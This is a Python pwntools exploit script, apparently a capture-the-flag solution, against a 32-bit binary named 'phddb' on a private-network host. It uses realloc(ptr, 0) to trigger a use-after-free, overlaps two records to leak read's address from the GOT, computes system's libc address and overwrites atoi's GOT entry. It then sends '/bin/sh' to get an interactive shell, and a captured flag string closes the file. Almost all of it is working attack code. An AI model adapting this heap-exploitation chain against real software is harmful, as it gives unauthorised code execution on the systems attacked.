#!/usr/bin/env python

from pwn import *

'''
void *realloc(void *ptr, size_t size);
realloc()  will revise the area which  ptr point to size and return the new pointer

if original size is n, and the new size < n, than the area will not change.
if new size > n, than the new area still not be format after distribution.

if ptr = NULL than it is equal to  malloc(size)
it is equal to  free(ptr), if the size = 0
'''
phd = ELF('./phddb')
lib = ELF('./libc.so.6-32')

r = remote('192.168.31.25',55688)

# Step 1 : add one
r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.sendline('name')
r.recvuntil(':')
r.sendline('11')
r.recvuntil(':')
r.sendline('32') # <- set size equal to struct phd
r.recvuntil(':')
r.sendline('AAAAAAAAAAAA')

# Step 2 : edit and realloc( ptr , 0 ) to free(ptr)
r.recvuntil(':')
r.sendline('3')
r.recvuntil(':')
r.sendline('0')
r.recvuntil(':')
r.sendline('name')
r.recvuntil(':')
r.sendline('123')
r.recvuntil(':')
r.sendline('0')

# Step 3 : add another and it will use the memory area whitch we freed in Step 2
r.recvuntil(':')
r.sendline('2')
r.recvuntil(':')
r.sendline('name')
r.recvuntil(':')
r.sendline('11')
r.recvuntil(':')
r.sendline('32')
r.recvuntil(':')
r.sendline('BBBBBBBBBBBB')

# Step 4 : from now thesis of index 0 is point to phd2
#	   use phd1's thesis to change phd2's thesis point to certain fuction
r.recvuntil(':')
r.send('3\n')
r.recvuntil(':')
r.send('0\n')
r.recvuntil(':')
r.send('name\n')
r.recvuntil(':')
r.send('123\n')
r.recvuntil(':')
r.send('32\n')
r.recvuntil(':')
r.send('B'*28+p32(phd.got['read']))

# Step 5 : leak infomation
r.recvuntil(':')
r.send('1\n')
r.recvuntil(':')
r.send('1\n')

res = r.recvuntil('choice:')
lib_read = res.split('\n')[3][:4]
lib_system = u32(lib_read) - lib.symbols['read'] + lib.symbols['system']

# Step 6 : set phd2's thesis point to atoi.got
r.send('3\n')
r.recvuntil(':')
r.send('0\n')
r.recvuntil(':')
r.send('name\n')
r.recvuntil(':')
r.send('123\n')
r.recvuntil(':')
r.send('32\n')
r.recvuntil(':')
r.send('B'*24+'\x20\x00\x00\x00'+p32(phd.got['atoi']))

# Step 7 : use phd2 to hijection !size should be the same to avoid realloc
r.recvuntil(':')
r.send('3\n')
r.recvuntil(':')
r.send('1\n')
r.recvuntil(':')
r.send('name\n')
r.recvuntil(':')
r.send('123\n')
r.recvuntil(':')
r.send('32\n')
r.recvuntil(':')
r.send(p32(lib_system))

# Step 8 :  atoi(/bin/sh) -> system(/bin/sh) 
r.recvuntil(':')
r.send('/bin/sh\n')

r.interactive()


#AD{reall0c_r34lloc_r3alloc_then_use_after_fr33}

